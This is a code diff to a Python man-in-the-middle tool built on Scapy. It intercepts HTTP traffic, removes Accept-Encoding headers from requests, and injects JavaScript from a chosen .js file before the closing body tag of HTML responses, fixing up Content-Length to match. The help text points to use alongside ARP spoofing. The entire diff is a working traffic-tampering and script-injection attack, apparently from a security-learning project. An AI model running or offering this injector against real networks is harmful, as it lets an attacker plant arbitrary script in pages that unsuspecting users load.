@@ -7,44 +7,93 @@ from termcolor import cprint
 import re
 
 LINE = '____________________________________________________________'
+END_TAG = '</body>'
+SCRIPT_TAG = '<script>CODE</script>'
 
 #Process each packet
 def process_packet(packet):
     IP_pkt = IP(packet.get_payload())
     
     if IP_pkt.haslayer(Raw) and IP_pkt.haslayer(TCP):
-        if IP_pkt[TCP].dport == 80:
-            cprint('Request', 'red', attrs=['bold',], end='')
-            #Search for Accept-Encoding Header (?\\r\\n = stop at first occurrence of \\r\\n)
-            #Remove Accept-Encoding header from request(we don't understand any encoding)
-            new_load = re.sub('Accept-Encoding:.*?\r\n', '', IP_pkt[Raw].load)
-           
-            print(new_load)
-            IP_pkt[Raw].load = new_load
+        #To manage fail of python convertion of some bytes
+        #(No HTML code, so I don't want to analyse this packet)
+        try:
+            load = IP_pkt[Raw].load.decode()
+        
+            if IP_pkt[TCP].dport == 80:
+                cprint('Request', 'red', attrs=['bold',])
                 
-            #Scapy recomputes them
-            del IP_pkt[IP].len
-            del IP_pkt[IP].chksum
-            del IP_pkt[TCP].chksum
+                '''Search for Accept-Encoding Header (?\\r\\n = stop at first occurrence of \\r\\n)
+                Remove Accept-Encoding header from request(we don't understand any encoding)
+                '''
+                load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
+                IP_pkt[Raw].load = load
 
-            packet.set_payload(bytes(IP_pkt))
+                #Scapy recomputes them
+                del IP_pkt[IP].len
+                del IP_pkt[IP].chksum
+                del IP_pkt[TCP].chksum
 
-        elif IP_pkt[TCP].sport == 80:
-            cprint('Response', 'blue', attrs=['bold',])
-            print(IP_pkt.show())
+                packet.set_payload(bytes(IP_pkt))
 
+            elif IP_pkt[TCP].sport == 80:
+                cprint('Response', 'blue', attrs=['bold',])
+                load = injection_code(load)
+
+                IP_pkt[Raw].load = load
+        
+                #Scapy recomputes them
+                del IP_pkt[IP].len
+                del IP_pkt[IP].chksum
+                del IP_pkt[TCP].chksum
+
+                packet.set_payload(bytes(IP_pkt))
+        
+        except UnicodeDecodeError:
+            pass
+    
     packet.accept()
 
 
+def injection_code(load):
+    global END_TAG, SCRIPT_TAG
+
+    #If the HTML page has TAG, I'm going to replace it with javascript code
+    load = load.replace(END_TAG, SCRIPT_TAG+END_TAG)
+    #If ?: for group (), group used to locate expression but it's not stored in expression
+    content_length_header = re.search("(?:Content-Length:\s)(\d*)", load)
+
+    if content_length_header and 'text/html' in load:
+        content_length = content_length_header.group(1)
+        print(f'Length {content_length}', end='')
+        new_length = int(content_length) + len(SCRIPT_TAG)
+        print(f'     {new_length}')
+        load = load.replace(content_length, str(new_length))
+        print(f'     {load}')
+
+    return load
 
 #Parser of command line argument
 def args_parser():
+    global SCRIPT_TAG
+
     parser = argparse.ArgumentParser()
     #Initialization of needed arguments
     parser.add_argument("-local", "-l", dest="local", help="If specified, IPTABLES updated to run program on local. Otherwise it works on forward machine (e.g. with arp spoofing).", action='store_true')
+    parser.add_argument("-file", "-f", dest="file", help="Name of javascript file to use.")
 
     #Parse command line arguments
     args = parser.parse_args()
+
+    if args.file and os.path.exists(args.file) and os.path.isfile(args.file) and ('.js') in args.file:
+        f = open(args.file, 'r')
+        code = f.read().replace('\n', '')
+        SCRIPT_TAG = SCRIPT_TAG.replace('CODE', code)
+        print(SCRIPT_TAG)
+    else:
+        cprint('\n\n[ERROR] Missing file', 'red', attrs=['bold',], end='\n\n')
+        parser.print_help()
+        exit(1)
 
     return args.local
 
